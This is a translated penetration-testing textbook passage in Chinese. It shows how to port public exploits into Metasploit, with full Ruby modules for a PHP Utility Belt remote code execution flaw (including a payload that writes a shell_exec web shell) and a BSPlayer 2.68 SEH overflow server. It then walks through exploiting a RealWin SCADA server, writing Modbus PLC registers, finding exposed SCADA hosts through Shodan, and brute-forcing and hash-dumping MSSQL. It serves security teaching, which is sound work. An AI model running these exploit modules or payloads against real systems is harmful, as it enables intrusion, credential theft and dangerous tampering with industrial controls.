# 将基于 Web 的 RCE 导入 Metasploit

在本节中，我们将看看如何将 Web 应用程序漏洞导入 Metasploit。本章的重点将是掌握与不同编程语言中使用的基本功能相当的功能。在本例中，我们将看看 2015 年 12 月 8 日披露的 PHP 实用工具包远程代码执行漏洞。可从以下网址下载受影响的应用程序：[`www.exploit-db.com/apps/222c6e2ed4c86f0646016e43d1947a1f-php-utility-belt-master.zip`](https://www.exploit-db.com/apps/222c6e2ed4c86f0646016e43d1947a1f-php-utility-belt-master.zip)。

远程代码执行漏洞位于`POST`请求的`code`参数中，当使用特制数据操纵时，可能导致服务器端代码的执行。让我们看看如何手动利用这个漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4d544578-7e5a-447e-aed6-15e04c2f6f11.png)

我们在前面的屏幕截图中使用的命令是`fwrite`，它用于将数据写入文件。我们使用`fwrite`以可写模式打开名为`info.php`的文件。我们向文件中写入`<?php $a = "net user"; echo shell_exec($a);?>`。

当我们的命令运行时，它将创建一个名为`info.php`的新文件，并将 PHP 内容放入该文件。接下来，我们只需要浏览`info.php`文件，就可以看到命令的结果。

让我们按以下方式浏览`info.php`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4b694398-d3b8-424e-a4ce-a4e7f2255d57.png)

我们可以看到所有用户帐户都列在`info.php`页面上。要为 PHP 工具包远程代码执行漏洞编写 Metasploit 模块，我们需要向页面发出 GET/POST 请求。我们需要发出一个请求，在该请求中，我们将我们的恶意数据 POST 到易受攻击的服务器上，并可能获得 meterpreter 访问。

# 收集必要的信息

在 Metasploit 中利用基于 Web 的漏洞时，最重要的事情是弄清楚 Web 方法，弄清楚使用这些方法的方式，以及弄清楚要传递给这些方法的参数。此外，我们需要知道的另一件事是受攻击的文件的确切路径。在这种情况下，我们知道漏洞存在于`CODE`参数中。

# 掌握重要的 Web 功能

在 Web 应用程序的上下文中，重要的 Web 方法位于`/lib/msf/core/exploit/http`下的`client.rb`库文件中，进一步链接到`/lib/rex/proto/http`下的`client.rb`和`client_request.rb`文件，其中包含与`GET`和`POST`请求相关的核心变量和方法。

`/lib/msf/core/exploit/http/client.rb`库文件中的以下方法可用于创建 HTTP 请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ee7dc12f-ae07-400b-9995-596ac1b8ff56.png)

`send_request_raw`和`send_request_cgi`方法在不同的上下文中进行 HTTP 请求时是相关的。

我们有`send_request_cgi`，在某些情况下比传统的`send_request_raw`函数提供了更多的灵活性，而`send_request_raw`有助于建立更直接的连接。我们将在接下来的部分讨论这些方法。

要了解我们需要传递给这些函数的数值，我们需要调查`REX`库。`REX`库提供了与请求类型相关的以下标头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a1ae8b68-eddd-4e6e-b464-3bbaa675cbf9.png)

通过使用前述参数，我们可以传递与我们的请求相关的各种值。一个例子是设置我们特定的 cookie 和我们选择的其他参数。让我们保持简单，专注于`URI`参数，即可利用的 Web 文件的路径。

`method`参数指定它是`GET`还是`POST`类型的请求。在获取/发布数据到目标时，我们将使用这些。

# GET/POST 方法的基本要点

`GET`方法将请求数据或来自指定资源的网页，并用它来浏览网页。另一方面，`POST`命令将来自表单或特定值的数据发送到资源进行进一步处理。现在，在编写基于 Web 的利用时，这非常方便。HTTP 库简化了将特定查询或数据发布到指定页面。

让我们看看我们需要在这个利用中执行的操作：

1.  创建一个`POST`请求

1.  使用`CODE`参数将我们的有效载荷发送到易受攻击的应用程序

1.  获取目标的 Meterpreter 访问权限

1.  执行一些后期利用功能

我们清楚我们需要执行的任务。让我们进一步迈出一步，生成一个兼容的匹配利用，并确认它是否有效。

# 将 HTTP 利用导入 Metasploit

让我们按照以下方式编写 Metasploit 中 PHP 实用程序皮带远程代码执行漏洞的利用：

```
class MetasploitModule < Msf::Exploit::Remote 

  include Msf::Exploit::Remote::HttpClient 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'           => 'PHP Utility Belt Remote Code Execution', 
      'Description'    => %q{ 
         This module exploits a remote code execution vulnerability in PHP Utility Belt 
      }, 
      'Author'         => 
        [ 
          'Nipun Jaswal', 
        ], 
      'DisclosureDate' => 'May 16 2015', 
      'Platform'       => 'php', 
      'Payload'        => 
        { 
          'Space'       => 2000, 
          'DisableNops' => true 
        }, 
      'Targets'        => 
        [ 
          ['PHP Utility Belt', {}] 
        ], 
      'DefaultTarget'  => 0 
    )) 

    register_options( 
      [ 
        OptString.new('TARGETURI', [true, 'The path to PHP Utility Belt', '/php-utility-belt/ajax.php']), 
   OptString.new('CHECKURI',[false,'Checking Purpose','/php-utility-belt/info.php']), 
      ]) 
  end 
```

我们可以看到我们已经声明了所有必需的库，并在初始化部分提供了必要的信息。由于我们正在利用基于 PHP 的漏洞，我们选择平台为 PHP。我们将`DisableNops`设置为 true，以关闭有效载荷中的`NOP`使用，因为利用针对的是 Web 应用程序中的远程代码执行漏洞，而不是基于软件的漏洞。我们知道漏洞存在于`ajax.php`文件中。因此，我们将`TARGETURI`的值声明为`ajax.php`文件。我们还创建了一个名为`CHECKURI`的新字符串变量，它将帮助我们为利用创建一个检查方法。让我们看一下利用的下一部分：

```
def check 
  send_request_cgi( 
      'method'    => 'POST', 
      'uri'       => normalize_uri(target_uri.path), 
      'vars_post' => { 
        'code' => "fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');" 
      } 
   ) 
  resp = send_request_raw({'uri' => normalize_uri(datastore['CHECKURI']),'method' => 'GET'}) 
  if resp.body =~ /phpinfo()/ 
   return Exploit::CheckCode::Vulnerable 
  else 
   return Exploit::CheckCode::Safe 
  end 
  end 
```

我们使用`send_request_cgi`方法以高效的方式容纳`POST`请求。我们将方法的值设置为`POST`，将 URI 设置为规范化格式中的目标 URI，并将`POST`参数`CODE`的值设置为`fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');`。这个有效载荷将创建一个名为`info.php`的新文件，同时编写代码，当执行时将显示一个 PHP 信息页面。我们创建了另一个请求，用于获取我们刚刚创建的`info.php`文件的内容。我们使用`send_request_raw`技术并将方法设置为`GET`来执行此操作。我们之前创建的`CHECKURI`变量将作为此请求的 URI。

我们可以看到我们将请求的结果存储在`resp`变量中。接下来，我们将`resp`的主体与`phpinfo()`表达式进行匹配。如果结果为真，将表示`info.php`文件已成功创建到目标上，并且`Exploit::CheckCode::Vulnerable`的值将返回给用户，显示标记目标为易受攻击的消息。否则，它将使用`Exploit::CheckCode::Safe`将目标标记为安全。现在让我们进入利用方法：

```
  def exploit 
    send_request_cgi( 
      'method'    => 'POST', 
      'uri'       => normalize_uri(target_uri.path), 
      'vars_post' => { 
        'code' => payload.encoded 
      } 
    ) 
  end 
end 
```

我们可以看到我们刚刚创建了一个带有我们有效载荷的简单`POST`请求。一旦它在目标上执行，我们就会获得 PHP Meterpreter 访问权限。让我们看看这个利用的效果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8b55d368-febe-452a-98e2-fab97148a29f.png)

我们可以看到我们已经在目标机器上获得了 Meterpreter 访问权限。我们已成功将远程代码执行漏洞转换为 Metasploit 中的可工作利用。

官方的 Metasploit 模块已经存在于 PHP 实用工具包中。您可以从以下链接下载利用：[`www.exploit-db.com/exploits/39554/`](https://www.exploit-db.com/exploits/39554/)。

# 将 TCP 服务器/基于浏览器的利用导入 Metasploit

在接下来的部分中，我们将看到如何将基于浏览器或 TCP 服务器的利用导入 Metasploit。

在应用程序测试或渗透测试期间，我们可能会遇到无法解析请求/响应数据并最终崩溃的软件。让我们看一个在解析数据时存在漏洞的应用程序的例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7db3f606-a65b-424e-b98c-1170c42baf3e.png)

本例中使用的应用程序是 BSplayer 2.68。我们可以看到我们有一个监听端口`81`的 Python 利用。当用户尝试从 URL 播放视频时，漏洞在解析远程服务器的响应时出现。让我们看看当我们尝试从端口`81`上的监听器中流式传输内容时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cd716a16-ebc1-470d-a30c-e13b7ecf3684.png)

我们可以看到计算器应用程序弹出，这表明利用成功运行。

从以下链接下载 BSplayer 2.68 的 Python 利用：[`www.exploit-db.com/exploits/36477/`](https://www.exploit-db.com/exploits/36477/)。

让我们看一下利用代码，并收集构建 Metasploit 模块所需的基本信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b6674a0f-3c2a-4a48-9719-879662dc9dfd.png)

这个利用很简单。然而，利用的作者使用了向后跳转技术来找到由有效载荷传递的 shellcode。这种技术用于对抗空间限制。这里需要注意的另一件事是，作者发送了恶意缓冲区两次来执行有效载荷，这是由于漏洞的性质。让我们尝试在下一节中建立一个表，列出我们转换这个利用为 Metasploit 兼容模块所需的所有数据。

# 收集基本要素

让我们看一下下表，突出显示了所有必要的值及其用法：

| **序列号** | **变量** | **值** |
| --- | --- | --- |
| 1 | 偏移值 | `2048` |
| 2 | 内存中已知包含 POP-POP-RETN 系列指令/P-P-R 地址的位置 | `0x0000583b` |
| 3 | 向后跳转/长跳转以找到 shellcode | `\xe9\x85\xe9\xff\xff` |
| 4 | 短跳转/指向下一个 SEH 帧的指针 | `\xeb\xf9\x90\x90` |

现在我们已经拥有构建 BSplayer 2.68 应用的 Metasploit 模块的所有基本要素。我们可以看到作者在`2048` NOP 之后精确放置了 shellcode。然而，这并不意味着实际的偏移值是`2048`。利用的作者将其放置在 SEH 覆盖之前，因为可能没有空间留给 shellcode。然而，我们将采用这个值作为偏移量，因为我们将按照原始利用的确切过程进行。此外，`\xcc`是一个断点操作码，但在这个利用中，它被用作填充。`jmplong`变量存储了向后跳转到 shellcode，因为存在空间限制。`nseh`变量存储了下一个帧的地址，这只是一个短跳转，正如我们在上一章中讨论的那样。`seh`变量存储了`P/P/R`指令序列的地址。

在这种情况下需要注意的一个重要点是，我们需要目标机器连接到我们的利用服务器，而不是我们试图连接到目标机器。因此，我们的利用服务器应该始终监听传入的连接，并根据请求传递恶意内容。

# 生成 Metasploit 模块

让我们开始在 Metasploit 中编写我们的漏洞的编码部分：

```
class MetasploitModule < Msf::Exploit::Remote 
  Rank = NormalRanking 

  include Msf::Exploit::Remote::TcpServer 

  def initialize(info={}) 
    super(update_info(info, 
      'Name'           => "BsPlayer 2.68 SEH Overflow Exploit", 
      'Description'    => %q{ 
        Here's an example of Server Based Exploit 
      }, 
      'Author'         => [ 'Nipun Jaswal' ], 
      'Platform'       => 'win', 
      'Targets'        => 
        [ 
          [ 'Generic', {'Ret' => 0x0000583b, 'Offset' => 2048} ], 
        ], 
      'Payload'  =>  
       { 
       'BadChars' => "\x00\x0a\x20\x0d" 
       }, 
      'DisclosureDate' => "May 19 2016", 
      'DefaultTarget'  => 0)) 
  end 
```

通过与许多漏洞一起工作，我们可以看到前面的代码部分并无不同，除了来自`/lib/msf/core/exploit/tcp_server.rb`的 TCP 服务器库文件。TCP 服务器库提供了处理传入请求并以各种方式处理它们所需的所有必要方法。包含此库使得额外选项如`SRVHOST`、`SRVPORT`和`SSL`成为可能。让我们看看代码的剩余部分：

```
def on_client_connect(client) 
return if ((p = regenerate_payload(client)) == nil) 
    print_status("Client Connected") 
    sploit = make_nops(target['Offset']) 
    sploit << payload.encoded 
    sploit << "\xcc" * (6787-2048 - payload.encoded.length)  
    sploit << "\xe9\x85\xe9\xff\xff"  
    sploit << "\xeb\xf9\x90\x90" 
    sploit << [target.ret].pack('V') 
    client.put(sploit) 
    client.get_once 
    client.put(sploit) 
    handler(client) 
    service.close_client(client) 
  end 
end 
```

我们可以看到，我们没有这种类型漏洞的漏洞方法。但是，我们有`on_client_connect`、`on_client_data`和`on_client_disconnect`方法。最有用且最简单的是`on_client_connect`方法。一旦客户端连接到所选的`SRVHOST`和`SRVPORT`上的漏洞服务器，此方法将被触发。

我们可以看到，我们使用`make_nops`以 Metasploit 的方式创建了 NOPs，并使用`payload.encoded`嵌入了有效载荷，从而消除了硬编码有效载荷的使用。我们使用了类似于原始漏洞的方法组装了`sploit`变量的其余部分。然而，为了在请求时将恶意数据发送回目标，我们使用了`client.put()`，它将以我们选择的数据回应目标。由于漏洞需要将数据两次发送到目标，我们使用了`client.get_once`来确保数据被发送两次，而不是合并成单个单元。将数据两次发送到目标，我们触发了主动寻找来自成功利用的传入会话的处理程序。最后，我们通过发出`service.client_close`调用来关闭与目标的连接。

我们可以看到我们在代码中使用了`client`对象。这是因为来自特定目标的传入请求将被视为单独的对象，并且还将允许多个目标同时连接。

让我们看看我们的 Metasploit 模块的运行情况：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/724811da-24b6-42b5-a4e6-8abdb9895c45.png)

让我们从 BSplayer 2.8 连接到端口`8080`上的漏洞服务器，方法如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/273b6582-a87e-408e-8bae-3b0031ac184d.png)

一旦有连接尝试连接到我们的漏洞处理程序，Meterpreter 有效载荷将传递到目标，并且我们将看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/58eb7755-4617-4b6b-a4ab-79a918e32311.png)

中奖！Meterpreter shell 现在可访问。我们成功地使用 TCP 服务器库在 Metasploit 中编写了一个漏洞服务器模块。在 Metasploit 中，我们还可以使用 HTTP 服务器库建立 HTTP 服务器功能。

有关更多 HTTP 服务器功能，请参阅：[`github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/http/server.rb`](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/http/server.rb)。

# 总结

在移植漏洞的头脑风暴练习中，我们现在已经开发了在 Metasploit 中导入各种漏洞的方法。通过阅读本章，我们学会了如何轻松地将不同类型的漏洞移植到框架中。在本章中，我们开发了从独立漏洞中找出必要要素的机制。我们看到了各种 HTTP 功能及其在利用中的用法。我们还复习了基于 SEH 的漏洞利用以及如何构建漏洞服务器。

您可以尝试以下练习：

+   从以下网站将 10 个漏洞移植到 Metasploit：[`exploit-db.com/`](https://exploit-db.com/)

+   至少开发 3 个浏览器漏洞并将它们移植到 Metasploit

+   尝试创建自己的自定义 shellcode 模块并将其移植到 Metasploit

到目前为止，我们已经涵盖了大部分漏洞编写练习。在下一章中，我们将看到如何利用 Metasploit 对各种服务进行渗透测试，包括 VOIP、DBMS、SCADA 等。


# 第十五章：使用 Metasploit 测试服务

现在让我们来谈谈测试各种专业服务。作为渗透测试人员，你可能会遇到一个只需要在数据库、VOIP 或 SCADA 等服务中进行测试的可测试环境。在本章中，我们将探讨在进行这些服务的渗透测试时使用的各种发展策略。在本章中，我们将涵盖以下内容：

+   理解 SCADA 的利用

+   ICS 的基础知识及其关键性质

+   进行数据库渗透测试

+   测试 VOIP 服务

基于服务的渗透测试需要敏锐的技能和对我们可以成功利用的服务的深刻理解。因此，在本章中，我们将探讨在服务导向的渗透测试中可能面临的理论和实际挑战。

# 测试 SCADA 系统的基础知识

**监控控制和数据采集**（**SCADA**）是软件和硬件元素的组合，用于控制大坝、发电站、炼油厂、大型服务器控制服务等活动。

SCADA 系统是为高度特定的任务而构建的，例如控制分派水的水平，控制天然气管道，控制电力网以管理特定城市的电力以及各种其他操作。

# ICS 和其组件的基础知识

SCADA 系统是**工业控制系统**（**ICS**）系统，用于关键环境或生命受到威胁的地方。工业控制系统负责控制各种过程，例如在特定比例中混合两种化学品，将二氧化碳注入特定环境，向锅炉中加入适量的水等。

这些 SCADA 系统的组件如下：

| **组件** | **用途** |
| --- | --- |
| **远程终端单元**（**RTU**） | RTU 是将模拟测量转换为数字信息的设备。此外，用于通信的最广泛使用的协议是**ModBus**。 |
| **可编程逻辑控制器**（**PLC**） | PLC 与 I/O 服务器和实时操作系统集成；它的工作方式与 RTU 完全相同。它还使用诸如 FTP 和 SSH 的协议。 |
| **人机界面**（**HMI**） | HMI 是环境的图形表示，由 SCADA 系统观察或控制。HMI 是 GUI 界面，也是攻击者利用的一个领域。 |
| **智能电子设备**（**IED**） | IED 是一个微芯片，或更具体地说是一个控制器，可以发送命令执行特定操作，例如在特定物质的特定量混合后关闭阀门。 |

# ICS-SCADA 的重要性

ICS 系统非常关键，如果它们的控制权落入错误的手中，可能会发生灾难性的情况。想象一下，如果一个恶意行为者黑客入侵了天然气管道的 ICS 控制，我们不仅会遭受服务拒绝，甚至可能会造成 SCADA 系统的损坏，甚至导致生命的丧失。你可能看过电影《虎胆龙威 4.0》，在电影中，黑客们重定向天然气管道到特定站点看起来很酷，交通混乱似乎是一种乐趣的来源。然而，在现实中，当出现这样的情况时，它将对财产造成严重损害，并可能导致生命的丧失。

正如我们过去所看到的，随着**Stuxnet 蠕虫**的出现，关于 ICS 和 SCADA 系统安全性的讨论已经受到严重侵犯。让我们进一步讨论如何侵入 SCADA 系统或测试它们，以便为更美好的未来保护它们。

# 利用 SCADA 服务器中的 HMI

在本节中，我们将讨论如何测试 SCADA 系统的安全性。我们有很多框架可以测试 SCADA 系统，但考虑到所有这些都会超出本书的范围。因此，为了简化起见，我们将继续讨论使用 Metasploit 进行 SCADA HMI 利用的特定内容。

# SCADA 测试基础

让我们了解利用 SCADA 系统的基础知识。SCADA 系统可以使用 Metasploit 中最近添加到框架中的各种漏洞进行妥协。一些位于互联网上的 SCADA 服务器可能具有默认的用户名和密码。然而，由于安全性的提高，找到具有默认凭据的服务器的可能性极小，但这可能是一种可能性。

像[`shodan.io`](https://shodan.io)这样的流行互联网扫描网站是寻找面向互联网的 SCADA 服务器的绝佳资源；让我们看看我们需要执行哪些步骤来将 Shodan 与 Metasploit 集成：

首先，我们需要在[`shodan.io`](https://shodan.io)网站上创建一个帐户：

1.  注册后，我们可以在我们的帐户中轻松找到我们的 API 密钥。获取 API 密钥后，我们可以在 Metasploit 中搜索各种服务。

1.  启动 Metasploit 并加载`auxiliary/gather/shodan_search`模块。

1.  在模块中设置`SHODAN_API`密钥选项为您帐户的 API 密钥。

1.  让我们尝试使用由 Rockwell Automation 开发的系统来查找 SCADA 服务器，将`QUERY`选项设置为`Rockwell`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ecdd59a9-8596-472a-a3f0-d5e176839209.png)

1.  我们设置了所需的`SHODAN_APIKEY`选项和`QUERY`选项，如前面的截图所示。让我们通过运行模块来分析结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1fa57e7f-7617-4803-80ac-8a90f1f992db.png)

我们发现许多通过 Rockwell Automation 使用 Metasploit 模块轻松运行 SCADA 服务的系统。然而，最好不要尝试对你一无所知的网络进行任何攻击，尤其是你没有权限的网络。

# 基于 SCADA 的利用

最近，我们看到 SCADA 系统受到的利用率远高于过去。SCADA 系统可能受到各种漏洞的影响，如基于堆栈的溢出、整数溢出、跨站脚本和 SQL 注入。

此外，这些漏洞可能对生命和财产造成危险，正如我们之前讨论的那样。SCADA 设备被黑客攻击的可能性主要在于 SCADA 开发人员和操作人员的粗心编程和糟糕的操作程序。

让我们看一个 SCADA 服务的例子，并尝试使用 Metasploit 进行利用。在下面的案例中，我们将使用 Metasploit 在基于 Windows XP 系统的 DATAC RealWin SCADA Server 2.0 系统上进行利用。

该服务在端口`912`上运行，容易受到`sprintf` C 函数的缓冲区溢出的影响。`sprintf`函数在 DATAC RealWin SCADA 服务器的源代码中用于显示从用户输入构造的特定字符串。当攻击者滥用这个易受攻击的函数时，可能导致目标系统完全被攻陷。

让我们尝试使用 Metasploit 利用`exploit/windows/scada/realwin_scpc_initialize`漏洞来利用 DATAC RealWin SCADA Server 2.0，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/42dd3f26-9db1-498c-867a-70c4525394d3.png)

我们将 RHOST 设置为`192.168.10.108`，有效载荷设置为`windows/meterpreter/bind_tcp`。DATAC RealWin SCADA 的默认端口是`912`。让我们利用目标并检查我们是否可以利用这个漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/01da61da-eebd-44a0-9ede-97fd66c8a114.png)

太棒了！我们成功地利用了目标。让我们加载`mimikatz`模块以找到系统的明文密码，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c1dbabff-f1c4-4bb0-94dd-eaccc397d720.png)

我们可以看到，通过发出`kerberos`命令，我们可以找到明文密码。我们将在本书的后半部分进一步讨论`mimikatz`功能和其他附加库。

# 攻击 Modbus 协议

大多数 SCADA 服务器都位于内部/空隔网络中。但是，考虑一种可能性，即攻击者已经获得了对面向互联网的服务器的初始访问权限，并从同一服务器进行了枢纽转移；他可以更改 PLC 的状态，读取和写入控制器的值，并造成混乱。让我们看一个示例来演示这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1ac27c2d-4e6f-4e7c-a687-0244a8de2b3b.png)

在前面的屏幕截图中，我们可以看到攻击者已经访问了 IP 范围为`192.168.174.0`的系统，并已经识别并添加了一个到内部网络范围`192.168.116.0`的路由。

此时，攻击者将在内部网络中的主机上执行端口扫描。假设我们在内部网络中找到了一个 IP 为`192.168.116.131`的系统。这里需要进行广泛的端口扫描，因为不良做法可能会导致严重问题。让我们看看如何在这种情况下执行端口扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/65587dae-230f-4d26-88f1-aa8519b66277.png)

我们可以看到，前面的扫描不是常规扫描。我们使用了`-n`开关来禁用 DNS 解析。`-sT`开关表示使用扫描延迟为 1 秒的 TCP 连接扫描，这意味着端口将按顺序逐个进行扫描。Nmap 扫描产生了以下结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fba33e9a-df61-476f-a50b-bc1054622eb8.png)

端口号`502`是标准的 Modbus/TCP 服务器端口，允许与 SCADA 软件中的 PLC 进行通信。有趣的是，我们有一个 Metasploit `modbusclient`模块，可以与 Modbus 端口通信，并可能允许我们更改 PLC 中寄存器的值。让我们看一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e80eb993-c4be-4871-8428-3d3c8742d703.png)

我们可以看到，辅助模块的默认操作是读取寄存器。将四个寄存器设置为`DATA_ADDRESS`将产生存储在第四个数据寄存器中的值。我们可以看到值为`0`。让我们尝试在`DATA_ADDRESS 3`处的不同寄存器上进行操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4f95befd-0291-4bac-8d1d-c03744e61ab8.png)

嗯，将值设置为`3`会读取`56`作为输出，这意味着第三个数据寄存器中的值为`56`。我们可以将这个值视为温度，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e0a56d37-81c2-42e4-a37f-a67cc572683b.png)

攻击者可以通过将辅助模块的操作更改为`WRITE_REGISTERS`来改变这些值，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/03ff06a1-e6ba-43b7-867c-63367677e804.png)

让我们看看我们是否可以将值写入寄存器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b79f2234-b0bc-4879-a3c1-3918122849cd.png)

我们可以看到，值已经成功更改，这也意味着在 HMI 上温度读数可能会不可避免地增加，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c7b24cb0-72c8-4071-88bc-825346190b7b.png)

前面的示例界面仅用于说明目的，以及展示 SCADA 和 ICS 系统的重要性。我们还可以通过将操作设置为`READ_COILS`来操纵线圈中的值。此外，我们可以通过将`NUMBER`选项设置如下来读取/写入多个寄存器和线圈中的数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/09873bb7-5da1-41d1-9fe3-5bb43e5586fa.png)

我们在 Metasploit 中有很多专门针对 SCADA 系统漏洞的利用。要了解有关这些漏洞的更多信息，您可以参考 SCADA 黑客和安全网站上关于这些漏洞的最重要资源：[`www.scadahacker.com`](http://www.scadahacker.com)。您应该能够在[`scadahacker.com/resources/msf-scada.html`](http://scadahacker.com/resources/msf-scada.html)的*msf-scada*部分下找到许多列出的利用。

# 保护 SCADA

对 SCADA 网络进行安全保护是任何渗透测试人员的首要目标。让我们进入下一部分，学习如何安全实施 SCADA 服务并对其进行限制。

# 实施安全的 SCADA

在实际执行 SCADA 安全时，确保 SCADA 系统的安全性是一项艰巨的任务；然而，我们可以在确保 SCADA 系统安全时寻找以下一些关键点：

+   密切关注对 SCADA 网络的每一次连接，并检查是否有任何未经授权的尝试

+   确保所有网络连接在不需要时都被断开

+   实施系统供应商提供的所有安全功能

+   为内部和外部系统实施 IDPS 技术，并应用 24 小时的事件监控

+   记录所有网络基础设施，并为管理员和编辑者定义个别角色

+   建立 IR 团队和蓝队，定期识别攻击向量

# 限制网络

在未经授权访问、不需要的开放服务等攻击事件发生时，网络可以进行调整。通过删除或卸载服务来实施治疗是对各种 SCADA 攻击的最佳防御。

SCADA 系统主要部署在 Windows XP 系统上，这显著增加了攻击面。如果您部署了 SCADA 系统，请确保您的 Windows 系统是最新的，以防止更常见的攻击。

# 数据库利用

在介绍了 SCADA 利用的基础知识之后，让我们转向测试数据库服务。在这一部分，我们的主要目标将是测试数据库并检查各种漏洞。数据库包含了关键的业务数据。因此，如果数据库管理系统中存在漏洞，可能导致远程代码执行或完全网络妥协，这可能导致公司机密数据的泄露。与财务交易、医疗记录、犯罪记录、产品、销售、营销等相关的数据可能对地下社区的买家有利。

为了确保数据库完全安全，我们需要开发测试这些服务的方法论，以抵御各种类型的攻击。现在，让我们开始测试数据库，并查看在数据库渗透测试中进行不同阶段的过程。

# SQL 服务器

微软于 1989 年推出了其数据库服务器。如今，相当大比例的网站都在最新版本的 MSSQL 服务器上运行——这是网站的后端。然而，如果网站规模庞大或每天处理大量交易，那么数据库没有任何漏洞和问题是至关重要的。

在测试数据库的这一部分，我们将专注于有效测试数据库管理系统的策略。默认情况下，MSSQL 运行在 TCP 端口号`1433`上，UDP 服务运行在端口`1434`上。因此，让我们开始测试运行在 Windows 8 上的 MSSQL Server 2008。

# 使用 Metasploit 模块扫描 MSSQL

让我们进入专门用于测试 MSSQL 服务器的 Metasploit 模块，并看看我们可以通过使用它们获得什么样的信息。我们将首先使用的辅助模块是`mssql_ping`。该模块将收集额外的服务信息。

因此，让我们加载模块并按以下步骤开始扫描过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/75c3300b-d82a-4fbb-bf86-9c4eac540772.png)

从以前的结果中我们可以看到，我们从扫描中获得了大量信息。Nmap 提供了一个类似的模块来扫描 MSSQL 数据库。然而，Metasploit 的辅助模块在可读性上比 Nmap 的输出具有竞争优势。让我们看看还有哪些模块可以用来测试 MSSQL 服务器。

# 暴力破解密码

渗透测试数据库的下一步是精确检查认证。Metasploit 有一个内置模块名为`mssql_login`，我们可以用它作为认证测试工具，来暴力破解 MSSQL 服务器数据库的用户名和密码。

让我们加载模块并分析结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2a7b5425-8417-4274-8bff-c9ccc237c022.png)

一旦我们运行这个模块，它会在第一步测试默认凭据，也就是使用用户名`sa`和空密码，并发现登录成功。因此，我们可以得出结论，仍然在使用默认凭据。此外，如果无法立即找到`sa`账户，我们必须尝试测试更多的凭据。为了实现这一点，我们将使用包含用于暴力破解 DBMS 用户名和密码的字典的文件的名称来设置`USER_FILE`和`PASS_FILE`参数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/25e443e6-5601-4961-90c7-d58d2f8931b1.png)

让我们设置所需的参数，即`USER_FILE`列表、`PASS_FILE`列表和`RHOSTS`，以成功运行这个模块。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e5753db0-fb80-428e-b724-68b2683ba0bb.png)

当我们针对目标数据库服务器运行这个模块时，我们将得到类似以下截图的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bdf50004-6927-4548-93e1-1e125e34be90.png)

从前面的结果中可以看出，我们有两个条目对应于用户在数据库中成功登录。我们找到了一个默认用户`sa`，密码为空，另一个用户`nipun`，密码是`12345`。

# 定位/捕获服务器密码

我们知道我们有两个用户：`sa`和`nipun`。让我们使用其中一个，并尝试找到另一个用户的凭据。我们可以借助`mssql_hashdump`模块来实现这一点。让我们检查它的工作并调查所有其他哈希值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/28465756-6f26-4a99-944e-f7841631aa53.png)

我们可以看到，我们已经获得了数据库服务器上其他账户的密码哈希。现在我们可以使用第三方工具破解它们，并且还可以提升或访问其他数据库和表。

# 浏览 SQL 服务器

我们在前面的部分找到了用户及其对应的密码。现在，让我们登录到服务器，并收集关于数据库服务器的基本信息，如存储过程、当前存在的数据库数量和名称、可以登录到数据库服务器的 Windows 组、数据库中的文件以及参数。

我们将要使用的模块是`mssql_enum`。让我们看看如何在目标数据库上运行这个模块：

